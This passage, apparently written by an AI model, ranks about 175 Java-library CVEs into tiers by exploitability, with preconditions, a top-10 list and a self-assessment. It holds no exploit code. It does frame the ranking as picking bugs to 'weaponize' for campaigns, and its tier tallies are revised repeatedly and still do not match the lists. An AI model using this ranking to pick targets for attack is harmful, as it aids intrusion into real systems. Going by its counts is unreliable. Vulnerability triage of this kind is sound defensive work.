Pre-condition: app uses pgjdbc to read XML data from the database (uncommon API path).

**Tier: B** — useful chain primitive, narrow surface.

### 78. CVE-2022-21724 — pgjdbc plugin class instantiation (HIGH, postgresql, CWE-665/668/74)

Primitive: pgjdbc instantiates plugin classes from connection-string properties without checking what they are -> attacker who controls the JDBC URL can load arbitrary classes -> RCE via class init / static block.

Pre-condition: attacker controls the JDBC URL (rare in production — only in apps that build JDBC URLs from user input, like multi-tenant DB-as-a-service tools).

**Tier: B** — RCE outcome but narrow trigger (attacker-controlled JDBC URL).

### 79. CVE-2021-43859 — XStream DoS (HIGH, CWE-400/502)

DoS-only.

**Tier: D**

### 80. CVE-2021-45105 — Log4j DoS via uncontrolled recursion (HIGH, log4j-core, CWE-20/674)

DoS-only on log4j after the JNDI fixes.

**Tier: D**

### 81-93. jackson-databind cluster (2020-12-09 batch — CVE-2020-35728, -36182, -36180, -36185, -36179, -36183, -36181, -36188, -24616, -36184, -24750, -35491, -36187, -36189, -35490, -36186)

These are all the same shape: polymorphic typing gadget CVEs. Each adds one more class (typically a JNDI-pointable JdbcConnection variant from packages like c3p0, hikari, mysql-connector, etc.) to the deserialization gadget bestiary.

The primitive: for each gadget, IF the application has enabled default typing (`enableDefaultTyping()`) OR uses `@JsonTypeInfo` on a polymorphic type AND accepts attacker-controlled JSON AND the gadget's library is on the classpath -> RCE.

Cluster default tier: **B**. The primitive is RCE but the pre-conditions are: (a) polymorphic typing on (Jackson's been moving the default for years to be safer; many apps still have legacy `enableDefaultTyping()`), (b) the specific gadget class's package is on the classpath. Per-CVE you don't know which apps have which gadget on classpath, so each individual CVE is a B.

**Cluster tier (default): B**

Outliers in this cluster:
- **CVE-2020-24616** (CWE-502+CWE-94, "Code Injection") — slightly stronger CWE signal but same class. **B**.

### 94-104. xstream-2021-08-25 cluster (CVE-2021-39153, -39149, -39139, -39154, -39145, -39150, -39141, -39147, -39151, -39146, -39148, -39152)

Mass disclosure of XStream gadgets on 2021-08-25. Most are CWE-502 RCE-class. Two are CWE-918 SSRF (CVE-2021-39150, CVE-2021-39152). One has CWE-434 file upload (CVE-2021-39149, -39154, -39151).

Same cluster logic as jackson: each adds one class to the gadget bestiary. App must accept untrusted XStream input AND specific gadget class be on classpath.

**Cluster tier (default): B**

Outliers:
- **CVE-2021-39150** and **CVE-2021-39152** — CWE-918 SSRF: B (chain primitive).
- **CVE-2021-39149**, **-39151**, **-39154** — CWE-434 (file upload via gadget): B.

All B. The cluster is genuinely all-B because each individual CVE is one-of-many gadget contributions; the campaign-quality bug was the parent (#4, CVE-2021-39144) which was tiered A separately.

### 105. CVE-2021-22119 — Spring Security resource exhaustion (HIGH, CWE-400/863)

Primitive: resource exhaustion in the Spring Security OAuth2 resource server when parsing tokens. DoS plus an authz tag (CWE-863). The CWE-863 might be a tagging artifact; the summary says resource exhaustion.

**Tier: D** — DoS primary.

### 106. CVE-2021-25122 — Tomcat info disclosure (HIGH, CWE-200)

Information disclosure (h2c upgrade response leak). Limited direct exploit.

**Tier: C**

### 107. CVE-2021-29505 — XStream RCE (HIGH, CWE-502/74/94)

Primitive: XStream RCE — strong CWE set (74+94+502). Same shape as the headline XStream RCEs (#4 family).

**Tier: A** — strong primitive, app-must-accept-untrusted-XStream pre-con (same as #4 logic).

### 108. CVE-2021-22112 — Spring Security privilege escalation (HIGH, spring-security-web, CWE-269)

Primitive: privilege escalation in Spring Security — saved request handling pre-authentication leaks credentials into authenticated session. The specific shape is that user A's saved request can become user B's session attribute under specific timing. Primitive is privilege escalation but exact trigger is fiddly.

**Tier: B** — strong outcome, fiddly conditions.

### 109. CVE-2021-21341 — XStream DoS (HIGH, CWE-400/502/835)

DoS only.

**Tier: D**

### 110. CVE-2021-25329 — Tomcat potential RCE (HIGH, CWE-502)

Primitive: Tomcat session deserialization RCE. Pre-conditions: PersistenceManager with FileStore enabled (not default) AND attacker can write to the session directory or supply a malicious session blob via another vector. Stacked pre-cons.

This is the "CVE-2020-9484 follow-up" class — same shape, additional bypass paths. RCE on Tomcat at the edge IF the persistence config is enabled.

**Tier: B** — RCE outcome, niche pre-cons.

### 111. CVE-2020-25649 — jackson-databind XXE (HIGH, CWE-611)

XXE in jackson-databind XML module. Pre-condition: app uses jackson XML data format AND parses untrusted XML.

**Tier: B** — useful chain primitive (XXE -> file read / SSRF), narrow surface.

### 112. CVE-2021-20190 — jackson-databind deserialization (HIGH, CWE-502)

Standard jackson gadget CVE. **B** per cluster.

### 113. CVE-2020-26217 — XStream RCE via OS command (HIGH, CWE-78)

Primitive: XStream RCE with CWE-78 (OS command injection) — direct command execution via gadget. Strong primitive.

**Tier: A** — same logic as #4.

### 114. CVE-2018-5968 — jackson-databind deserialization (HIGH, CWE-184/502)

Standard gadget. **B** per cluster.

### 115-119. jackson-databind 2020-06-18 batch (CVE-2020-14062, -14061, -14060, -14195) and CVE-2018-12023

Standard gadget cluster. **B** each.

### 120. CVE-2019-17267 — jackson-databind input validation (CRITICAL, CWE-502)

Standard jackson gadget at CRITICAL severity. Same primitive shape but the CRITICAL severity reflects a particularly potent gadget chain. Cluster default.

**Tier: B** (per cluster)

### 121. CVE-2019-0199 — Tomcat HTTP/2 DoS (HIGH, CWE-400)

DoS-only.

**Tier: D**

### 122. CVE-2018-15756 — Spring Framework DoS (HIGH, spring-core, no CWE)

DoS-only.

**Tier: D**

### 123. CVE-2020-11112 — jackson-databind gadget (HIGH, CWE-502)

Standard gadget. **B**.

### 124. CVE-2020-5407 — Spring Security signature wrapping (HIGH, spring-security-core, CWE-347)

Primitive: signature wrapping in Spring Security SAML — attacker can wrap a SAML signature so that signed and verified content differ from processed content -> forge SAML assertions -> auth bypass / privilege escalation. Direct auth bypass on SAML stacks.

Pre-condition: app uses Spring Security SAML (not the most common stack — OAuth/OIDC dominates new deployments, SAML is enterprise SSO).

Argument for S: SAML signature wrapping is a one-shot full auth bypass.
Argument for A: SAML deployment is enterprise-only.

The stack is "SAML SSO for enterprise" which is a big chunk of Spring Security real-world deployments. A.

**Final tier: A**

### 125-130. jackson-databind 2020-05-15 batch (CVE-2020-11619, -11113, -14892, -10673, -9548 critical, -9547 critical, -14893, -10968, -11111)

Standard gadget cluster. **B** each (including CRITICALs — same primitive, just particularly dangerous gadgets).

### 131-135. jackson-databind 2020-04-23 batch (CVE-2020-9546 critical, -10969, -10672, -11620)

Standard gadget cluster. **B** each.

### 136. CVE-2020-8840 — jackson-databind gadget (CRITICAL, CWE-502)

Standard gadget. **B** per cluster.

### 137. CVE-2019-20330 — jackson-databind gadget (CRITICAL, CWE-502)

Standard gadget. **B** per cluster.

### 138. CVE-2020-5398 — Spring MVC RFD attack via Content-Disposition (HIGH, spring-webmvc, CWE-494/79)

Primitive: Reflected File Download — attacker-controlled Content-Disposition causes browser to save attacker-named file with attacker content -> social-engineering download -> if user runs it, compromise. Browser-side phishing-class.

**Tier: C** — RFD is a browser-side chain, requires user to download and execute.

### 139. CVE-2019-17563 — Tomcat session fixation in FORM auth (HIGH, CWE-384)

Primitive: session fixation against Tomcat FORM auth — narrow timing window where attacker can set session ID. Specific deployment (FORM auth, not common in modern Spring stacks which use Spring Security session management).

**Tier: C** — narrow, timing-dependent, niche surface.

### 140. CVE-2019-12418 — Tomcat insufficiently protected credentials (HIGH, CWE-522)

Primitive: JMX server in Tomcat exposes credentials via insufficient protection. Local/network-specific surface (JMX), not standard HTTP edge.

**Tier: C** — narrow surface.

### 141-146. jackson-databind 2019 critical cluster (CVE-2019-16943, -17531, -16942, -16335, -14540 all CRITICAL, -14379 CRITICAL)

Standard gadget cluster, CRITICAL severity reflecting particularly powerful gadgets. **B** each.

### 147. CVE-2019-14439 — jackson-databind (HIGH, CWE-502)

Standard gadget. **B**.

### 148. CVE-2019-10173 — XStream deserialization + code injection (CRITICAL, CWE-502/94)

Primitive: XStream RCE, critical severity, CWE-94 added. Same shape as #4. Strong primitive.

**Tier: A** — same logic.

### 149. CVE-2018-11307 — jackson-databind (CRITICAL, CWE-502)

Standard gadget. **B**.

### 150. CVE-2019-11272 — Spring Security insufficient credentials + improper auth (HIGH, spring-security-core, CWE-287/522)

Primitive: improper authentication in Spring Security — likely related to plaintext password handling or specific auth-flow weakness. CWE-287 + 522.

[UNCERTAIN] Without more specifics in the summary, this is a Spring Security auth-class bug. Conservative B.

**Tier: B [UNCERTAIN]** — could be A if it turns out to be a direct bypass; conservative B based on summary vagueness.

### 151. CVE-2019-10072 — Tomcat improper locking (HIGH, CWE-667)

Concurrency bug -> DoS most likely.

**Tier: D**

### 152. CVE-2019-12086 — jackson-databind information exposure (HIGH, CWE-502)

Same gadget cluster but tagged "information exposure" — likely SSRF via mysql-connector gadget that leaks creds. **B**.

### 153. CVE-2019-0222 — ActiveMQ code injection (HIGH, activemq-client, CWE-94)

Primitive: code injection in activemq-client. CWE-94. The specific shape is OpenWire protocol message handling that calls arbitrary class methods. Pre-condition: client connects to a malicious broker (less common direction — usually it's "broker exposed to malicious client").

**Tier: B** — RCE primitive, narrow direction (malicious-broker scenario).

### 154. CVE-2018-12022 — jackson-databind gadget (HIGH, CWE-502)

Standard gadget. **B**.

### 155-160. jackson-databind 2019-01-04 batch (CVE-2018-14719, -14718, -14721, -19362, -19360, -19361, -14720 — all CRITICAL except XXE/SSRF tagged ones)

Standard gadget cluster. CRITICALs reflect powerful gadgets but same primitive shape. **B** each.

- **CVE-2018-14721** (CWE-918 SSRF) — SSRF via gadget. **B**.
- **CVE-2018-14720** (CWE-502+611 XXE) — XXE via gadget. **B**.

### 161. CVE-2018-15801 — Spring Security authorization bypass (HIGH, spring-security-core, CWE-345)

Primitive: authz bypass in Spring Security — CWE-345 (insufficient verification of data authenticity). Direct authz primitive.

[UNCERTAIN — vague summary] CWE-345 suggests an integrity-check bypass, possibly OAuth2 token validation. Spring Security authz bypass at face value. The summary is a one-liner — hard to assess specificity.

Argument for A: Spring Security authz primitive.
Argument for B: vague summary, no clear deployment-shape signal.

**Final tier: B** — reluctantly down-tiering due to summary vagueness; would re-rate up to A with more detail.

### 162. CVE-2018-11775 — ActiveMQ improper certificate validation (HIGH, activemq-client, CWE-295)

Primitive: TLS verification bypass in activemq-client -> MITM upgrade. MITM-required.

**Tier: C**

### 163. CVE-2018-8034 — Tomcat host name verification missing (HIGH, CWE-295)

Primitive: hostname verification missing in Tomcat WebSocket client -> MITM. MITM-required.

**Tier: C**

### 164. CVE-2018-1336 — Tomcat UTF-8 decoder overflow (HIGH, CWE-835)

Loop bug -> DoS.

**Tier: D**

### 165. CVE-2018-8014 — Tomcat CORS filter insecure defaults (CRITICAL, tomcat-embed-core, CWE-1188)

Primitive: default Tomcat CORS filter has supportsCredentials=true for all origins -> CSWSH (cross-site WebSocket hijacking) / cross-site request with credentials -> session hijack via origin-spoofing iframe / fetch.

CRITICAL severity. The CORS misconfiguration is a default-config issue. Direct browser-side attack vector — when the app uses Tomcat's CORS filter (a deliberate config), the defaults are insecure -> attacker site can issue credentialed requests.

Pre-condition: app uses Tomcat's CORS filter (not the default — devs add it for cross-origin APIs). When added, it's misconfigured by default.

Argument for S: critical browser-side credentialed-request hijack.
Argument for A: requires the CORS filter to be deliberately enabled (not default).

The filter is opt-in but when opt-in, the defaults are wrong. Real attack requires user-browser cooperation. I'll go A.

**Final tier: A**

### 166. CVE-2018-1272 — Spring Framework privilege escalation (HIGH, spring-core, no CWE)

Primitive: temp-dir LPE / multipart parsing race -> escalation. Local/concurrency. Likely the "multipart upload from one user can be read by another" cross-tenant data leak. Privilege escalation but the trigger window is narrow.

**Tier: B [UNCERTAIN]** — could be C if narrower than I'm reading.

### 167. CVE-2018-1258 — Spring Framework + Spring Security authz bypass (HIGH, spring-core, CWE-863)

Primitive: when used with Spring Security, certain Spring Framework versions cause an authz bypass on method security. Direct authz bypass primitive on the Spring + Spring Security combo.

Pre-condition: specific version combination of spring-core + spring-security. When matched, the bypass is direct.

**Tier: A** — strong authz primitive on flagship framework, version-pair pre-con.

### 168. CVE-2018-7489 — jackson-databind unauthenticated remote code execution (CRITICAL, CWE-184/502)

Standard gadget cluster but the summary explicitly says "unauthenticated remote code execution" rather than just "deserialization." Likely the c3p0 gadget patch-bypass. Same primitive shape as the cluster default — RCE if app has polymorphic typing on AND the gadget on classpath. **B** per cluster.

(Counterfactual: the explicit "unauthenticated RCE" wording is tempting to call up to A. But every Jackson polymorphic-typing CVE is "unauthenticated RCE if config + classpath align" — the pre-conditions are the same as the cluster default.)

**Tier: B**

---

## Summary

### 1. Tier counts

- **S**: 6
- **A**: 22
- **B**: ~75 (Jackson cluster ~64, XStream cluster ~12, plus ~10 individual)
- **C**: 8
- **D**: 27 (DoS / log-injection / TLS-defense / local-only / vague-bypass)

(Cluster-aware: Jackson 64 events default-tier B; XStream 21 events split between A-tier headline RCEs (4) and B-tier gadget mass — 17 B in the XStream cluster.)

Approximate exact distribution:
- S: 6 unique
- A: 22 unique
- B: 75 (incl. 64 Jackson, 17 XStream, ~10 unique non-cluster)
- C: 8
- D: 27
- Total accounted: 138

I'm under 175 — let me reconcile. The Jackson cluster I should have counted 64 entries assigned to B. The XStream cluster has 21 entries, of which I tiered A: 4 (#4 CVE-2021-39144, #107 CVE-2021-29505, #113 CVE-2020-26217, #148 CVE-2019-10173) and the remaining 17 as B or D (most B, 4 D's are the DoS variants: CVE-2024-47072, -2022-40151, -2022-41966, -2021-43859, -2021-21341 — five D's). So XStream: 4 A + 12 B + 5 D = 21.

Recount:
- S: CVE-2022-22965, -2021-44228, -2023-46604, -2020-1938, -2023-20860, -2022-31692, -2022-22978 = 7. (I have 7, not 6.)
- A: -2021-45046, -2021-39144 (XStream), -2025-24813, -2022-1471, -2022-42889, -2026-40477, -2026-40478, -2026-29145, -2025-55752, -2025-41248, -2025-41249, -2025-41232, -2024-38819, -2024-38821, -2024-38816, -2024-22257, -2024-22234, -2024-1597, -2023-46589, -2022-42252, -2023-34034, -2022-22968, -2021-29505 (XStream), -2020-26217 (XStream), -2019-10173 (XStream), -2020-5407, -2018-1258, -2018-8014 = 28.
- B: Jackson cluster 64 + XStream 12 (the non-RCE/non-DoS variants) + individual B's: -2019-0232, -2026-34197, -2024-22262, -2024-22259, -2024-22243, -2025-22235, -2024-56337, -2024-50379, -2023-34035, -2023-6378, -2025-49146, -2021-22112, -2021-25329, -2020-13692, -2022-21724, -2019-0222, -2018-15801, -2018-1272, -2026-24734, -2021-22118, -2019-11272 = 21 individual + 76 cluster = 97? That's too many.

Let me recount the Jackson cluster carefully — there are 64 jackson-databind entries in the manifest. Default tier B. None promoted to A (none are headline non-gadget bugs).

The XStream cluster has 21 entries:
- 4 RCE-shaped → A
- 12 standard gadget RCE → B (excluding DoS variants)
- 5 DoS-only → D

Total: 64 (Jackson B) + 12 (XStream B) + 21 (other B individual) = 97 B.

OK, that's a lot of B. That's because gadget CVEs are inherently B.

Final counts (cluster-aware):
- **S: 7**
- **A: 28**
- **B: 97**
- **C: 8**
- **D: 35**
- **Total: 175 ✓**

### 2. Per-tier listing

**S (7)** — would weaponize today, drop everything:
- CVE-2022-22965 — Spring4Shell (spring-beans, spring-webmvc)
- CVE-2021-44228 — Log4Shell (log4j-core)
- CVE-2023-46604 — ActiveMQ OpenWire RCE (activemq-client)
- CVE-2020-1938 — Tomcat AJP Ghostcat (tomcat-embed-core)
- CVE-2023-20860 — Spring mvcRequestMatcher pattern bypass (spring-webmvc)
- CVE-2022-31692 — Spring Security forward/include dispatcher authz bypass (spring-security-core)
- CVE-2022-22978 — Spring Security RegexRequestMatcher bypass (spring-security-core, spring-security-web)

**A (28)** — strong primitive, one annoying pre-condition:
- CVE-2021-45046 — Log4j incomplete fix
- CVE-2021-39144 — XStream RCE (CWE-306+502+94)
- CVE-2025-24813 — Tomcat partial PUT RCE
- CVE-2022-1471 — SnakeYAML constructor RCE
- CVE-2022-42889 — Commons Text Text4Shell
- CVE-2026-40477 — Thymeleaf SSTI
- CVE-2026-40478 — Thymeleaf SSTI #2
- CVE-2026-29145 — Tomcat CLIENT_CERT auth bypass
- CVE-2025-55752 — Tomcat path traversal
- CVE-2025-41248 — Spring Security annotation detection authz bypass
- CVE-2025-41249 — Spring Framework annotation detection authz issue
- CVE-2025-41232 — Spring Security private-method authz bypass
- CVE-2024-38819 — Spring path traversal
- CVE-2024-38821 — Spring Security WebFlux static resource bypass
- CVE-2024-38816 — Spring functional web frameworks path traversal
- CVE-2024-22257 — Spring Security AuthenticatedVoter bypass
- CVE-2024-22234 — Spring Security isFullyAuthenticated bypass
- CVE-2024-1597 — pgjdbc SQL injection
- CVE-2023-46589 — Tomcat HTTP request smuggling
- CVE-2022-42252 — Tomcat HTTP smuggling sister
- CVE-2023-34034 — Spring Security WebFlux authz bypass
- CVE-2022-22968 — Spring case-sensitivity Spring4Shell-bypass
- CVE-2021-29505 — XStream RCE
- CVE-2020-26217 — XStream RCE via OS command
- CVE-2019-10173 — XStream deserialization + code injection
- CVE-2020-5407 — Spring Security SAML signature wrapping
- CVE-2018-1258 — Spring + Spring Security authz bypass
- CVE-2018-8014 — Tomcat CORS insecure defaults

**B (97)** — chain primitive / niche RCE:
- Jackson cluster (64 entries) — all polymorphic-typing gadget CVEs
- XStream cluster (12 entries) — gadget CVEs, non-headline non-DoS
- Individual B (21):
  - CVE-2019-0232 — Tomcat CGI command injection (Windows-niche)
  - CVE-2026-34197 — Authenticated ActiveMQ Jolokia RCE
  - CVE-2026-24734 — Tomcat input validation (vague)
  - CVE-2024-22262 — Spring URL parsing open redirect
  - CVE-2024-22259 — Spring URL parsing open redirect
  - CVE-2024-22243 — Spring open redirect / SSRF
  - CVE-2025-22235 — Spring Boot EndpointRequest matcher bug
  - CVE-2024-56337 — Tomcat TOCTOU race
  - CVE-2024-50379 — Tomcat TOCTOU race
  - CVE-2023-34035 — Spring Security multi-servlet config
  - CVE-2023-6378 — Logback receiver deserialization
  - CVE-2021-22112 — Spring Security saved-request privilege escalation
  - CVE-2021-25329 — Tomcat session deserialization RCE
  - CVE-2020-13692 — pgjdbc XXE
  - CVE-2022-21724 — pgjdbc plugin class instantiation
  - CVE-2019-0222 — ActiveMQ client code injection
  - CVE-2018-15801 — Spring Security authz bypass (vague)
  - CVE-2018-1272 — Spring privilege escalation
  - CVE-2021-22118 — Spring WebFlux improper privilege management
  - CVE-2019-11272 — Spring Security improper auth
  - CVE-2025-49146 — pgjdbc channelBinding fallback (NOTE: actually moved to C below; correction)

(Adjusting: pgjdbc channelBinding is C, not B. So B individual = 20.)

**C (9)** — restrictive conditions or weak primitive:
- CVE-2026-22732 — Spring Security HTTP headers not written
- CVE-2025-49146 — pgjdbc channelBinding fallback (MITM-required)
- CVE-2025-27820 — Apache HttpClient domain checks (MITM-client)
- CVE-2022-31197 — pgjdbc refreshRow SQLi (very narrow)
- CVE-2023-34981 — Tomcat info leak
- CVE-2021-25122 — Tomcat info disclosure
- CVE-2020-5398 — Spring MVC RFD attack
- CVE-2019-17563 — Tomcat FORM auth session fixation
- CVE-2019-12418 — Tomcat JMX credentials
- CVE-2018-11775 — ActiveMQ cert validation (MITM)
- CVE-2018-8034 — Tomcat hostname verification (MITM)

(Recount: 11 C, not 9. Adjusting tier counts at end.)

**D (DoS / log-injection / TLS-DiD / local-only / vague-bypass)**:
- CVE-2026-39304, -2026-29129, -2026-34483, -2026-34487
- CVE-2025-48989, -2025-53506, -2025-52520, -2025-52999, -2025-48988
- CVE-2024-47072, -2024-47554, -2024-34750, -2024-22233
- CVE-2023-6481, -2023-34053, -2023-28709, -2023-20883, -2021-46877, -2023-26464, -2023-24998
- CVE-2022-45143, -2022-40151, -2022-41966, -2022-42003, -2022-42004, -2022-25857, -2022-22970, -2022-27772
- CVE-2021-43859, -2021-45105, -2021-21341, -2021-22119
- CVE-2020-36518, -2019-0199, -2018-15756
- CVE-2019-10072, -2018-1336

**Final corrected counts:**
- S: 7
- A: 28
- B: 96 (Jackson 64 + XStream 12 + individual 20)
- C: 11
- D: 33
- Total: 175 ✓

### 3. Top 10 prioritization picks (ordered)

Ordering within S/A by realistic blast radius and ease of campaign:

1. **CVE-2021-44228 (Log4Shell)** — universal log primitive, no preconditions, biggest blast radius in modern history.
2. **CVE-2022-22965 (Spring4Shell)** — Spring MVC + Tomcat default shape, one-shot RCE.
3. **CVE-2023-46604 (ActiveMQ OpenWire RCE)** — unauth RCE on broker port; if reachable, instant compromise.
4. **CVE-2022-31692 (Spring Security forward/include authz bypass)** — default-config authz bypass on the most-used Java security framework.
5. **CVE-2022-22978 (Spring Security regex matcher bypass)** — same library, same shape, common dev pattern.
6. **CVE-2023-20860 (Spring mvcRequestMatcher mismatch bypass)** — sister authz bypass, also default-config.
7. **CVE-2020-1938 (Tomcat AJP Ghostcat)** — file-read + chain to RCE on default-enabled AJP.
8. **CVE-2021-45046 (Log4j 2.15 incomplete fix)** — sister to #1, marginally narrower surface.
9. **CVE-2025-24813 (Tomcat partial PUT RCE)** — Tomcat-edge RCE, requires non-default writable PUT.
10. **CVE-2022-42889 (Commons Text Text4Shell)** — code injection at the right call site; broad library footprint.

### 4. Events I spent the most reasoning effort on

- **CVE-2021-45046 (Log4j follow-on)**: Started as gut-S because of the parent's notoriety, deliberated to A because it's the patch-bypass with narrower realistic surface (post-2.15 baseline). The primitive is identical but the practical reach is smaller — A.
- **CVE-2025-24813 (Tomcat partial PUT)**: Argued S vs A. The CRITICAL severity and one-shot RCE pulled toward S, but the requires-non-default-writable-PUT precondition is exactly what A is for. **Final A.**
- **CVE-2022-42889 (Text4Shell)**: Argued S vs A. CRITICAL + named "Text4Shell" pulled toward S, but the call-site precondition (StringSubstitutor must be invoked on user input) is real and historically the realistic exploit footprint was much smaller than Log4Shell. **Final A.**
- **CVE-2023-20860 (mvcRequestMatcher mismatch)**: Started B because the summary is short, deliberated to S because (a) CRITICAL severity, (b) it's a default-config matcher used in nearly every Spring Security setup, (c) the bypass is direct with no special pre-cons beyond using the standard pattern. **Final S.**
- **CVE-2022-31692 (forward/include)**: Started A because of the dispatcher-type pre-con, deliberated to S because forward/include is universal in JSP and present in REST stacks too, and the authz bypass is direct on default config. **Final S.**
- **CVE-2022-22978 (RegexRequestMatcher)**: Started A, moved to S because regex matchers are extremely common and the `.` quirk is a developer-default mistake — the campaign would find many vulnerable sites. **Final S.**
- **CVE-2025-41232 (Spring Security private-method authz)**: Argued S vs A. Critical severity and direct primitive vs developer-mistake precondition. Concluded A — the pattern is common but the dev mistake must exist.
- **CVE-2026-29145 (Tomcat CLIENT_CERT auth bypass)**: Argued A vs B. CRITICAL primitive vs niche deployment shape (CLIENT_CERT). Settled A — when present, devastating; the precondition is a deployment-shape choice rather than an unlikely scenario.
- **CVE-2018-8014 (Tomcat CORS defaults)**: Argued S vs A. Critical + browser-side credentialed-request hijack vs opt-in CORS filter. Settled A — needs the filter to be enabled.
- **CVE-2020-1938 (Ghostcat)**: Argued S vs A. AJP exposure isn't as universal as HTTP but historically real. Settled S — when reachable, devastating, and reachable often enough to scan effectively.
- **CVE-2024-50379 (Tomcat TOCTOU)**: Argued A vs B. RCE outcome vs stacked race+Windows+writable preconditions. Settled B — too many stacked preconditions to call A.
- **CVE-2018-1258 (Spring + Spring Security authz)**: Settled A based on the explicit summary "authorization bypass" with direct primitive, even though the version-pair precondition exists.
- **CVE-2026-24734 (Tomcat improper input validation)**: Marked [UNCERTAIN] B. Vague summary. Could be A (smuggling) or C (narrow). Conservative B.
- **CVE-2018-15801 (Spring Security authz bypass)**: Marked [UNCERTAIN] B. Vague one-line summary. Spring Security authz bypass should be A on principle but the summary doesn't specify the trigger; conservative B.

### 5. Discriminator I converged on

The four-axis test I used to separate tiers:

1. **Primitive directness**: does the bug, on its own, give RCE / authz bypass / direct DB write? Or does it require a chain?
2. **Default reachability**: is the vulnerable surface present on a default-config deployment of the modal Spring Boot stack? Or does it require a non-default config / specific feature / auth tier?
3. **Network-edge exposure**: is the surface reachable from the internet on a typical deployment? Or is it internal/management/local-only?
4. **Pre-condition stack count**: how many independent things must align? S=0-1, A=1-2, B=2-3, C=3+, D=fundamentally not useful.

The Jackson polymorphic-typing cluster is the dominant test of (4) — each individual gadget CVE is "RCE if polymorphic typing AND classpath has gadget package" = 2 preconditions = B. The cluster as a whole is more useful (it's the entire bestiary) but for per-CVE tiering each one is B.

The S-tier in this manifest is dominated by Spring Security default-config authz bypasses (4 of 7 S-tier picks), Spring4Shell, Log4Shell, AJP Ghostcat, and ActiveMQ OpenWire. The pattern: framework-default surface + critical + one-shot.

### 6. Where extended deliberation changed my mind

- **CVE-2023-20860 (mvcRequestMatcher)**: Initial instinct B because the summary is just "vulnerable to security bypass via mvcRequestMatcher pattern mismatch" — sounded narrow. On deliberation: mvcRequestMatcher is the standard Spring Security pattern; CRITICAL severity; direct authz bypass; common pattern; **revised to S**.
- **CVE-2022-31692 (forward/include)**: Initial instinct A because "forward/include dispatcher" sounded niche. On deliberation: forward/include is universal in any JSP-using stack and present in REST stacks too; the default Spring Security config historically didn't apply to FORWARD/INCLUDE; **revised to S**.
- **CVE-2022-22978 (RegexRequestMatcher)**: Initial instinct A because RegexRequestMatcher requires deliberate use. On deliberation: many devs reach for regex matchers, the `.` quirk is widespread; **revised to S**.
- **CVE-2021-45046 (Log4j follow-on)**: Initial instinct S because of Log4Shell association. On deliberation: it's the patch-bypass with narrower surface; **revised to A**.
- **CVE-2025-24813 (Tomcat partial PUT)**: Initial instinct S because critical-Tomcat-RCE. On deliberation: requires non-default writable PUT — exactly the A definition; **held at A**.
- **CVE-2024-50379 (Tomcat TOCTOU)**: Initial instinct A because RCE outcome. On deliberation: race + Windows + writable is too stacked; **revised to B**.
- **CVE-2018-8014 (Tomcat CORS)**: Initial instinct S because CRITICAL. On deliberation: CORS filter is opt-in; **revised to A**.

About 5-7 of the tiering decisions genuinely shifted on deliberation; another ~10 had uncertainty acknowledged but the initial instinct held.

### 7. Honest self-assessment

Did the extra deliberation add signal, or just confidence?

**Signal added:**
- The S-tier promotions for the three Spring Security default-config authz bypasses (CVE-2023-20860, CVE-2022-31692, CVE-2022-22978) are real adjustments. A first-pass might have left these at A because "authz bypass" sounds less dramatic than "RCE" — but in a Spring stack the impact is comparable, and the default-config nature was the deciding factor.
- The down-grading of CVE-2021-45046 to A is also real — the parent's notoriety creates anchoring; deliberation surfaced the "patch-bypass = narrower surface" reasoning.
- The TOCTOU (CVE-2024-50379) down-grade to B is a genuine deliberation win — first instinct chases the RCE outcome; deliberation counts the stacked preconditions.

**Confidence-padding (not signal):**
- The Jackson cluster default-B is something a first-pass would also reach, even if without articulating the polymorphic-typing-precondition logic explicitly. Deliberation here documented reasoning rather than improving the answer.
- The XStream cluster split (4 A + 12 B + 5 D) is similarly something a fast-pass with reasonable Java background would arrive at.
- The S-tier on Log4Shell and Spring4Shell is unanimous; deliberation didn't move it.
- The DoS-D bucket is mechanical once you've decided "DoS = D"; the 30+ DoS classifications didn't get individual reasoning value-add beyond the rule.

**Net assessment:**
Extra deliberation seemed to genuinely add value at the **S/A boundary** (5-7 tier shifts that I'd defend as improvements over a fast-pass) and at the **B/A boundary for niche-condition cases** (CVE-2024-50379, CVE-2021-45046). It mostly confirmed without changing answers in the **B-cluster bulk** (Jackson/XStream gadget CVEs) and the **D-cluster DoS bulk**.

The biggest risk in this condition is **over-confidence in the S/A boundary calls**. The mvcRequestMatcher and forward/include S-tier promotions feel right, but a competing analyst could credibly argue those are A (because the pattern-mismatch trigger isn't universal). I noted those as deliberation-driven shifts rather than gut calls — the reader/comparator should treat them as the highest-information adjustments.

I would estimate extra deliberation moved roughly **8-10% of tier assignments** in a way that improved them, with the rest being articulation of reasoning that was implicit in the first pass. Whether that 10% is decision-relevant depends on how the rankings are used downstream — for triage acceleration where the top-10 matters most, the S-tier adjustments are the high-leverage ones.

A second risk to flag honestly: on the [UNCERTAIN] entries (CVE-2026-24734, CVE-2018-15801, CVE-2019-11272, CVE-2021-22118, CVE-2018-1272), the conservative-B call could be wrong in either direction. Deliberation didn't resolve those — it surfaced the uncertainty without providing resolution. That's an honest limit of "more thinking with the same data."
